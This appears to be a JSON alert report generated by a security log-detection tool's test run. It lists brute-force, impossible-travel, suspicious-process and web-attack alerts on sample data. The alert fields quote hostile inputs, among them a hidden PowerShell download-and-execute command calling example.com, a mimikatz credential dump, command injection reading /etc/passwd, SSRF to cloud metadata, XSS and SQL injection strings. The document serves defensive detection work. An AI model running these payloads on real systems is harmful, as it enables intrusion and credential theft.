@@ -1,0 +1,910 @@
+{
+  "summary": {
+    "generated_at": "2026-06-24T15:46:00.055860+00:00",
+    "total_alerts": 31,
+    "by_severity": {
+      "high": 17,
+      "medium": 5,
+      "critical": 9
+    },
+    "by_rule": {
+      "BF-001": 3,
+      "IT-001": 1,
+      "SP-001": 3,
+      "WA-001": 24
+    },
+    "by_source_type": {
+      "linux_auth": 24,
+      "nginx": 22,
+      "apache": 22,
+      "windows_json": 14,
+      "json": 4
+    },
+    "true_positive_estimates": {
+      "BF-001": 0.85,
+      "SP-001": 0.95,
+      "WA-001": 0.8,
+      "IT-001": 0.7
+    },
+    "false_positive_notes": [
+      "BF-001: load balancer / health-check probes; scripts using expired passwords.",
+      "SP-001: legitimate admin use of encoded PowerShell; signed vendor installers.",
+      "WA-001: security scanners; aggressive WAF probes; legacy app false negatives.",
+      "IT-001: corporate VPN egressing through multiple POPs; mobile network hand-off."
+    ]
+  },
+  "alerts": [
+    {
+      "rule_id": "BF-001",
+      "rule_name": "Brute-force login (SSH/Windows)",
+      "severity": "high",
+      "description": "6 failed logins for user 'admin' from 203.0.113.6 within 25s",
+      "timestamp": "2026-03-07T14:30:25+00:00",
+      "source_events": [
+        "3bf13c6c9cad0e73e3018f00635f62d677782181210461bcca64c3ebf5a12cd9",
+        "0af1a6d05c68e796f489d14b50de0856bd31d149650bf0cce6fa1d74cfb22d29",
+        "1ee2c537fbad19daebd6b3d06b70138b87eb12107530a415f1ba98a15b03d36c",
+        "9318f4b11d0b9afaee9fe0fce61bc3f94d2117aa0ddf15ed345e42a938665c70",
+        "5bd08925f4850669e9dc8eaafa6454a0aaf8059288005101e38b10a7344c1f7a",
+        "290df078beb0bdab11ef8bbfa0f7a6e890f71100073540cefa0bef9810889539"
+      ],
+      "context": {
+        "source_ip": "203.0.113.6",
+        "user": "admin",
+        "failed_attempts": 6,
+        "window_seconds": 600,
+        "first_seen": "2026-03-07T14:30:00+00:00",
+        "last_seen": "2026-03-07T14:30:25+00:00",
+        "auth_methods": [
+          "ssh2"
+        ],
+        "source_types": [
+          "linux_auth"
+        ],
+        "note": "Possible false positives: load-balancer health checks, scripts with expired password. Correlate with successful login from same IP."
+      }
+    },
+    {
+      "rule_id": "IT-001",
+      "rule_name": "Impossible travel (anomalous geo-velocity)",
+      "severity": "medium",
+      "description": "Impossible travel for user 'alice': login from US at 2026-03-07T14:00:00+00:00 then from CN at 2026-03-07T14:30:00+00:00 (11587 km in 0:30:00).",
+      "timestamp": "2026-03-07T14:30:00+00:00",
+      "source_events": [
+        "7a84adb9fc491d3bba8a7dfcbcad8b792b5bbd1e6d23f2377887a64ab8e3b2ad",
+        "4ec0f1588f640df620500d5ebe6d81e6b5d3ea3960aead7b6b13cfbe24820a17"
+      ],
+      "context": {
+        "user": "alice",
+        "from_country": "US",
+        "to_country": "CN",
+        "from_ip": "1.2.3.4",
+        "to_ip": "5.6.7.8",
+        "distance_km": 11586.9,
+        "time_delta_seconds": 1800,
+        "implied_speed_kmh": 23173.8,
+        "max_speed_kmh": 900,
+        "first_login_at": "2026-03-07T14:00:00+00:00",
+        "second_login_at": "2026-03-07T14:30:00+00:00",
+        "note": "Possible false positives: corporate VPN that egresses through different POPs, mobile device switching between cell tower and Wi-Fi. Correlate with MFA challenge response."
+      }
+    },
+    {
+      "rule_id": "SP-001",
+      "rule_name": "Suspicious process execution",
+      "severity": "high",
+      "description": "Suspicious process execution detected: suspicious_parent_child:winword.exe->powershell.exe",
+      "timestamp": "2026-03-07T14:17:00+00:00",
+      "source_events": [
+        "beb2c9f5d270eaef5f508e9aa9f94b9ceb92bfee2b0c6a0f11d1f3fc5e4af5be"
+      ],
+      "context": {
+        "user": "carol",
+        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "process_parent_name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "command_line": "powershell.exe -nop -w hidden -c iex(iwr http://example.com/payload)",
+        "matched_patterns": [
+          "suspicious_parent_child:winword.exe->powershell.exe"
+        ],
+        "mitre_attack_ids": [
+          "T1204.002"
+        ],
+        "decoded_payload": null
+      }
+    },
+    {
+      "rule_id": "SP-001",
+      "rule_name": "Suspicious process execution",
+      "severity": "critical",
+      "description": "Suspicious process execution detected: mimikatz",
+      "timestamp": "2026-03-07T14:16:00+00:00",
+      "source_events": [
+        "68104031cecc2953b0f216d9265595b446fbded22b2f766f81622dbb730a5cc9"
+      ],
+      "context": {
+        "user": "admin",
+        "process_name": "C:\\Temp\\mimikatz.exe",
+        "process_parent_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "mimikatz.exe sekurlsa::logonpasswords exit",
+        "matched_patterns": [
+          "mimikatz"
+        ],
+        "mitre_attack_ids": [
+          "T1003.002"
+        ],
+        "decoded_payload": null
+      }
+    },
+    {
+      "rule_id": "SP-001",
+      "rule_name": "Suspicious process execution",
+      "severity": "high",
+      "description": "Suspicious process execution detected: encoded_powershell",
+      "timestamp": "2026-03-07T14:15:00+00:00",
+      "source_events": [
+        "a1d33d46579f241d07f775a295ec7d82d79b2e998715ef3018c3925a6c8c29f9"
+      ],
+      "context": {
+        "user": "admin",
+        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "process_parent_name": "C:\\Windows\\System32\\cmd.exe",
+        "command_line": "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAcAB5AHMAbwBjAC0AdABlAHMAdAA6ACAAaABhAHIAbQBsAGUAcwBzACAAZQBuAGMAbwBkAGUAZAAgAHAAYQB5AGwAbwBhAGQAJwA=",
+        "matched_patterns": [
+          "encoded_powershell"
+        ],
+        "mitre_attack_ids": [
+          "T1059.001"
+        ],
+        "decoded_payload": "Write-Host 'pysoc-test: harmless encoded payload'"
+      }
+    },
+    {
+      "rule_id": "BF-001",
+      "rule_name": "Brute-force login (SSH/Windows)",
+      "severity": "high",
+      "description": "7 failed logins for user 'Administrator' from 203.0.113.5 within 24s",
+      "timestamp": "2026-03-07T14:12:24+00:00",
+      "source_events": [
+        "c312ad113b7c47f282a5e69509aa45dccc13bec8d5414ca50bc6b633bb9a7fb3",
+        "9dfc012530cd38c5a39a622594aaa23633c0e48a8c0faafba667ff4e903efba7",
+        "ba24d544207c37563d37c37bd4c482c643d0518558c3a3d24b1e3d8d874283b3",
+        "9bc65a0a5146e5a441189b55865311ea9c639a457ab8f033525a96033ba89e2e",
+        "8a3d93dab1366f57c78840b7852613ce6ee2ce0369f917f94092a560c286cb4e",
+        "048ccb4d925767cc60b5f65f64dbea1656d0786999dd7ce615e72524f3b30d96",
+        "947a7c4f4d0ddc2c54825fc3b1489c4e4c94c9ee91f3a28a26d41565a61983f6"
+      ],
+      "context": {
+        "source_ip": "203.0.113.5",
+        "user": "Administrator",
+        "failed_attempts": 7,
+        "window_seconds": 600,
+        "first_seen": "2026-03-07T14:12:00+00:00",
+        "last_seen": "2026-03-07T14:12:24+00:00",
+        "auth_methods": [
+          "windows_logon_type_3"
+        ],
+        "source_types": [
+          "windows_json"
+        ],
+        "note": "Possible false positives: load-balancer health checks, scripts with expired password. Correlate with successful login from same IP."
+      }
+    },
+    {
+      "rule_id": "BF-001",
+      "rule_name": "Brute-force login (SSH/Windows)",
+      "severity": "high",
+      "description": "8 failed logins for user 'root' from 203.0.113.5 within 49s",
+      "timestamp": "2026-03-07T14:10:49+00:00",
+      "source_events": [
+        "5fd7e7400488b153ccc638d06552cfbfd4de27fb261ce8dc2cbe7e76b84e3c35",
+        "1ac346ef4d6dbdce0aeb4715cea96ed5622e589e0cf27069d8041f0dc4f97e6b",
+        "06fd5780f953162558edba448e2f8034ba4a525784381fefcb638ab22983b361",
+        "e67e5f7272979923f9e1df3c940039017c9e31d1b3b2595f94fa05798e7d118f",
+        "849d4a9fda332ff07c5b8c1d5eac510d6c80e27aa3d00ebe2b9cd7f3c05dab35",
+        "1fc875ce03817543ead7bb41352ec8806da66808cc5af546b21840ac7ba22dc6",
+        "6a3c2b9312b1dbafd5491f8e67a78fd95cb73f892108a2d20f971669e34fbeb3",
+        "4233f38d3d42cf150845e18cc6d3b5cbeb5f32a8feb3ad0306782f9862a3e514"
+      ],
+      "context": {
+        "source_ip": "203.0.113.5",
+        "user": "root",
+        "failed_attempts": 8,
+        "window_seconds": 600,
+        "first_seen": "2026-03-07T14:10:00+00:00",
+        "last_seen": "2026-03-07T14:10:49+00:00",
+        "auth_methods": [
+          "ssh2"
+        ],
+        "source_types": [
+          "linux_auth"
+        ],
+        "note": "Possible false positives: load-balancer health checks, scripts with expired password. Correlate with successful login from same IP."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "critical",
+      "description": "Web attack pattern(s) detected: path_traversal_etc_passwd, cmd_injection_semicolon",
+      "timestamp": "2026-03-07T14:09:00+00:00",
+      "source_events": [
+        "37bd38832695bb86d89fff359680e947a95d354ef9dbf1e7c1b68f81aa1e5d48"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/ping?host=8.8.8.8;cat /etc/passwd",
+        "http_status_code": 200,
+        "http_user_agent": "curl/8.4.0",
+        "matched_patterns": [
+          "path_traversal_etc_passwd",
+          "cmd_injection_semicolon"
+        ],
+        "mitre_attack_ids": [
+          "T1059.004",
+          "T1083"
+        ],
+        "families_matched": [
+          "cmd",
+          "path"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "critical",
+      "description": "Web attack pattern(s) detected: path_traversal_etc_passwd, cmd_injection_semicolon",
+      "timestamp": "2026-03-07T14:09:00+00:00",
+      "source_events": [
+        "165a8b2d5aee8edbf3bc804feb2cbac1b03de79f78c6e448bac8108d142d6254"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/ping?host=8.8.8.8;cat /etc/passwd",
+        "http_status_code": 200,
+        "http_user_agent": "curl/8.4.0",
+        "matched_patterns": [
+          "path_traversal_etc_passwd",
+          "cmd_injection_semicolon"
+        ],
+        "mitre_attack_ids": [
+          "T1059.004",
+          "T1083"
+        ],
+        "families_matched": [
+          "cmd",
+          "path"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "critical",
+      "description": "Web attack pattern(s) detected: ssrf_metadata, rfi_remote",
+      "timestamp": "2026-03-07T14:08:00+00:00",
+      "source_events": [
+        "89ef448b69daadf9f77c9b69bfd63b4bc250a6e8186035875191039d73c57700"
+      ],
+      "context": {
+        "source_ip": "198.51.100.42",
+        "http_method": "GET",
+        "http_url": "/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "http_status_code": 200,
+        "http_user_agent": "curl/8.4.0",
+        "matched_patterns": [
+          "ssrf_metadata",
+          "rfi_remote"
+        ],
+        "mitre_attack_ids": [
+          "T1190"
+        ],
+        "families_matched": [
+          "rfi",
+          "ssrf"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "critical",
+      "description": "Web attack pattern(s) detected: ssrf_metadata, rfi_remote",
+      "timestamp": "2026-03-07T14:08:00+00:00",
+      "source_events": [
+        "f58694be651b6e33cce46cc1fd7c0d1036886de488db56f7d6b2664187d69d65"
+      ],
+      "context": {
+        "source_ip": "198.51.100.42",
+        "http_method": "GET",
+        "http_url": "/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "http_status_code": 200,
+        "http_user_agent": "curl/8.4.0",
+        "matched_patterns": [
+          "ssrf_metadata",
+          "rfi_remote"
+        ],
+        "mitre_attack_ids": [
+          "T1190"
+        ],
+        "families_matched": [
+          "rfi",
+          "ssrf"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "critical",
+      "description": "Web attack pattern(s) detected: path_traversal_etc_passwd",
+      "timestamp": "2026-03-07T14:07:10+00:00",
+      "source_events": [
+        "d5ed7b335a528eaafd4ac643640306d03cb7ccf9819c5f32e64839dfdf596cf6"
+      ],
+      "context": {
+        "source_ip": "198.51.100.42",
+        "http_method": "GET",
+        "http_url": "/etc/passwd",
+        "http_status_code": 404,
+        "http_user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        "matched_patterns": [
+          "path_traversal_etc_passwd"
+        ],
+        "mitre_attack_ids": [
+          "T1083"
+        ],
+        "families_matched": [
+          "path"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "critical",
+      "description": "Web attack pattern(s) detected: path_traversal_etc_passwd",
+      "timestamp": "2026-03-07T14:07:10+00:00",
+      "source_events": [
+        "23d833f2afb550d1a86e7ae6cdc439d7efdee0113c6a09315f3906a71d1b6aba"
+      ],
+      "context": {
+        "source_ip": "198.51.100.42",
+        "http_method": "GET",
+        "http_url": "/etc/passwd",
+        "http_status_code": 404,
+        "http_user_agent": "python-requests/2.31.0",
+        "matched_patterns": [
+          "path_traversal_etc_passwd"
+        ],
+        "mitre_attack_ids": [
+          "T1083"
+        ],
+        "families_matched": [
+          "path"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "high",
+      "description": "Web attack pattern(s) detected: path_traversal_encoded",
+      "timestamp": "2026-03-07T14:07:05+00:00",
+      "source_events": [
+        "057a73636b4ecef936e27468d70819bc807e7c633e1689918c4787a97e5db0ca"
+      ],
+      "context": {
+        "source_ip": "198.51.100.42",
+        "http_method": "GET",
+        "http_url": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "http_status_code": 404,
+        "http_user_agent": "curl/8.4.0",
+        "matched_patterns": [
+          "path_traversal_encoded"
+        ],
+        "mitre_attack_ids": [
+          "T1083"
+        ],
+        "families_matched": [
+          "path"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "high",
+      "description": "Web attack pattern(s) detected: path_traversal_encoded",
+      "timestamp": "2026-03-07T14:07:05+00:00",
+      "source_events": [
+        "af15c403f03d19450cf35106475feedc82655abcf367df1065f5558a82c6af7b"
+      ],
+      "context": {
+        "source_ip": "198.51.100.42",
+        "http_method": "GET",
+        "http_url": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "http_status_code": 404,
+        "http_user_agent": "python-requests/2.31.0",
+        "matched_patterns": [
+          "path_traversal_encoded"
+        ],
+        "mitre_attack_ids": [
+          "T1083"
+        ],
+        "families_matched": [
+          "path"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "critical",
+      "description": "Web attack pattern(s) detected: path_traversal_dotdot, path_traversal_etc_passwd",
+      "timestamp": "2026-03-07T14:07:00+00:00",
+      "source_events": [
+        "9caa0628eb3609f3b1f89194fb0a05631fbbb447eb6b7bf761806144a84c2778"
+      ],
+      "context": {
+        "source_ip": "198.51.100.42",
+        "http_method": "GET",
+        "http_url": "../../../../etc/passwd",
+        "http_status_code": 404,
+        "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+        "matched_patterns": [
+          "path_traversal_dotdot",
+          "path_traversal_etc_passwd"
+        ],
+        "mitre_attack_ids": [
+          "T1083"
+        ],
+        "families_matched": [
+          "path"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "critical",
+      "description": "Web attack pattern(s) detected: path_traversal_dotdot, path_traversal_etc_passwd",
+      "timestamp": "2026-03-07T14:07:00+00:00",
+      "source_events": [
+        "ced8dad85002d8b4239b6b9e773418af3124b941f6b811391f16cccf0b91eacd"
+      ],
+      "context": {
+        "source_ip": "198.51.100.42",
+        "http_method": "GET",
+        "http_url": "../../../../etc/passwd",
+        "http_status_code": 404,
+        "http_user_agent": "python-requests/2.31.0",
+        "matched_patterns": [
+          "path_traversal_dotdot",
+          "path_traversal_etc_passwd"
+        ],
+        "mitre_attack_ids": [
+          "T1083"
+        ],
+        "families_matched": [
+          "path"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "high",
+      "description": "Web attack pattern(s) detected: xss_js_uri, cmd_injection_semicolon",
+      "timestamp": "2026-03-07T14:06:08+00:00",
+      "source_events": [
+        "33965fab17d53281f5b617723984f3d66fe3ec89ab504586f812508e8dd3cfac"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=javascript:alert(1)",
+        "http_status_code": 200,
+        "http_user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        "matched_patterns": [
+          "xss_js_uri",
+          "cmd_injection_semicolon"
+        ],
+        "mitre_attack_ids": [
+          "T1059.004",
+          "T1059.007"
+        ],
+        "families_matched": [
+          "cmd",
+          "xss"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "high",
+      "description": "Web attack pattern(s) detected: xss_js_uri, cmd_injection_semicolon",
+      "timestamp": "2026-03-07T14:06:08+00:00",
+      "source_events": [
+        "cf97225c6f3e5627a8edfaa9f7b7cc98e7361a8ecd1475010a52c84785d4f101"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=javascript:alert(1)",
+        "http_status_code": 200,
+        "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+        "matched_patterns": [
+          "xss_js_uri",
+          "cmd_injection_semicolon"
+        ],
+        "mitre_attack_ids": [
+          "T1059.004",
+          "T1059.007"
+        ],
+        "families_matched": [
+          "cmd",
+          "xss"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "high",
+      "description": "Web attack pattern(s) detected: xss_event_handler, xss_img_tag, cmd_injection_semicolon",
+      "timestamp": "2026-03-07T14:06:04+00:00",
+      "source_events": [
+        "4f24843d23e1d253daab1e4e9b0da7597ab2729155be8a20ed263e23a13380bf"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=<img src=x onerror=alert(1)>",
+        "http_status_code": 200,
+        "http_user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        "matched_patterns": [
+          "xss_event_handler",
+          "xss_img_tag",
+          "cmd_injection_semicolon"
+        ],
+        "mitre_attack_ids": [
+          "T1059.004",
+          "T1059.007"
+        ],
+        "families_matched": [
+          "cmd",
+          "xss"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "high",
+      "description": "Web attack pattern(s) detected: xss_event_handler, xss_img_tag",
+      "timestamp": "2026-03-07T14:06:04+00:00",
+      "source_events": [
+        "79f887c6633f7c0cc1909b6a61f60bf7d4a4c80f2f0a5dffc1de463135d6eaf4"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=<img src=x onerror=alert(1)>",
+        "http_status_code": 200,
+        "http_user_agent": "curl/8.4.0",
+        "matched_patterns": [
+          "xss_event_handler",
+          "xss_img_tag"
+        ],
+        "mitre_attack_ids": [
+          "T1059.007"
+        ],
+        "families_matched": [
+          "xss"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "high",
+      "description": "Web attack pattern(s) detected: xss_script_tag, cmd_injection_semicolon",
+      "timestamp": "2026-03-07T14:06:00+00:00",
+      "source_events": [
+        "e8e36dca59af658082cecd60a9cf07979eeea452d5331c2eaee5bf0b5ef79757"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=<script>alert(1)</script>",
+        "http_status_code": 200,
+        "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+        "matched_patterns": [
+          "xss_script_tag",
+          "cmd_injection_semicolon"
+        ],
+        "mitre_attack_ids": [
+          "T1059.004",
+          "T1059.007"
+        ],
+        "families_matched": [
+          "cmd",
+          "xss"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "high",
+      "description": "Web attack pattern(s) detected: xss_script_tag, cmd_injection_semicolon",
+      "timestamp": "2026-03-07T14:06:00+00:00",
+      "source_events": [
+        "50e20efc2f02bcc2663d5f3622796180edf015a5023b6e456ca8835481567c56"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=<script>alert(1)</script>",
+        "http_status_code": 200,
+        "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+        "matched_patterns": [
+          "xss_script_tag",
+          "cmd_injection_semicolon"
+        ],
+        "mitre_attack_ids": [
+          "T1059.004",
+          "T1059.007"
+        ],
+        "families_matched": [
+          "cmd",
+          "xss"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "medium",
+      "description": "Web attack pattern(s) detected: cmd_injection_semicolon",
+      "timestamp": "2026-03-07T14:05:09+00:00",
+      "source_events": [
+        "610ba98c95315749ea7684b66615e866056bdf8e0157d24fefb15eea2c5b98ef"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=1; DROP TABLE users",
+        "http_status_code": 200,
+        "http_user_agent": "curl/8.4.0",
+        "matched_patterns": [
+          "cmd_injection_semicolon"
+        ],
+        "mitre_attack_ids": [
+          "T1059.004"
+        ],
+        "families_matched": [
+          "cmd"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "medium",
+      "description": "Web attack pattern(s) detected: cmd_injection_semicolon",
+      "timestamp": "2026-03-07T14:05:09+00:00",
+      "source_events": [
+        "c864cf636046a4d8e25cf1ddc41a151c02fe792b9bc0e0a1d5d43de567c93cfb"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=1; DROP TABLE users",
+        "http_status_code": 200,
+        "http_user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        "matched_patterns": [
+          "cmd_injection_semicolon"
+        ],
+        "mitre_attack_ids": [
+          "T1059.004"
+        ],
+        "families_matched": [
+          "cmd"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "medium",
+      "description": "Web attack pattern(s) detected: sqli_comment",
+      "timestamp": "2026-03-07T14:05:06+00:00",
+      "source_events": [
+        "bffc84756a241358bd8647a1f51903fdd8f10642cd0c1262cff7e183c83e4d72"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=admin'--",
+        "http_status_code": 200,
+        "http_user_agent": "curl/8.4.0",
+        "matched_patterns": [
+          "sqli_comment"
+        ],
+        "mitre_attack_ids": [
+          "T1190"
+        ],
+        "families_matched": [
+          "sqli"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "medium",
+      "description": "Web attack pattern(s) detected: sqli_comment",
+      "timestamp": "2026-03-07T14:05:06+00:00",
+      "source_events": [
+        "84c192c7a7c22329a8b45db03c154633f15db4804e5b02249e93ab719ebc35e8"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=admin'--",
+        "http_status_code": 200,
+        "http_user_agent": "curl/8.4.0",
+        "matched_patterns": [
+          "sqli_comment"
+        ],
+        "mitre_attack_ids": [
+          "T1190"
+        ],
+        "families_matched": [
+          "sqli"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "high",
+      "description": "Web attack pattern(s) detected: sqli_union, sqli_comment, sqli_select_from, cmd_injection_semicolon",
+      "timestamp": "2026-03-07T14:05:03+00:00",
+      "source_events": [
+        "a2ad2d1ffa0d6644cb049d49504a328ab3624fe582c9e4e9a6c1bb1729c23a5d"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=1 UNION SELECT NULL, username, password FROM users--",
+        "http_status_code": 200,
+        "http_user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        "matched_patterns": [
+          "sqli_union",
+          "sqli_comment",
+          "sqli_select_from",
+          "cmd_injection_semicolon"
+        ],
+        "mitre_attack_ids": [
+          "T1059.004",
+          "T1190"
+        ],
+        "families_matched": [
+          "cmd",
+          "sqli"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "high",
+      "description": "Web attack pattern(s) detected: sqli_union, sqli_comment, sqli_select_from",
+      "timestamp": "2026-03-07T14:05:03+00:00",
+      "source_events": [
+        "2a5d64eacb003d04e52b2780cc81a1f6673f4d996ae0625a4c66e52ba77aac52"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=1 UNION SELECT NULL, username, password FROM users--",
+        "http_status_code": 200,
+        "http_user_agent": "python-requests/2.31.0",
+        "matched_patterns": [
+          "sqli_union",
+          "sqli_comment",
+          "sqli_select_from"
+        ],
+        "mitre_attack_ids": [
+          "T1190"
+        ],
+        "families_matched": [
+          "sqli"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "high",
+      "description": "Web attack pattern(s) detected: sqli_or_comment",
+      "timestamp": "2026-03-07T14:05:00+00:00",
+      "source_events": [
+        "96941da236ac65c152e68b58b34a31e8d3265b76cb4a99fdedabd44eeb3eaf6e"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=1' OR '1'='1",
+        "http_status_code": 200,
+        "http_user_agent": "python-requests/2.31.0",
+        "matched_patterns": [
+          "sqli_or_comment"
+        ],
+        "mitre_attack_ids": [
+          "T1190"
+        ],
+        "families_matched": [
+          "sqli"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    },
+    {
+      "rule_id": "WA-001",
+      "rule_name": "Web attack patterns (OWASP Top-10)",
+      "severity": "high",
+      "description": "Web attack pattern(s) detected: sqli_or_comment",
+      "timestamp": "2026-03-07T14:05:00+00:00",
+      "source_events": [
+        "300f8f262ff559de730324026a5b16e7076c44d91bcbb8d2edee291bbbe6f1fc"
+      ],
+      "context": {
+        "source_ip": "203.0.113.7",
+        "http_method": "GET",
+        "http_url": "/search?q=1' OR '1'='1",
+        "http_status_code": 200,
+        "http_user_agent": "curl/8.4.0",
+        "matched_patterns": [
+          "sqli_or_comment"
+        ],
+        "mitre_attack_ids": [
+          "T1190"
+        ],
+        "families_matched": [
+          "sqli"
+        ],
+        "note": "If source_ip is a known scanner (e.g., security tool, load balancer health-check), consider suppressing."
+      }
+    }
+  ],
+  "event_count": 86
+}
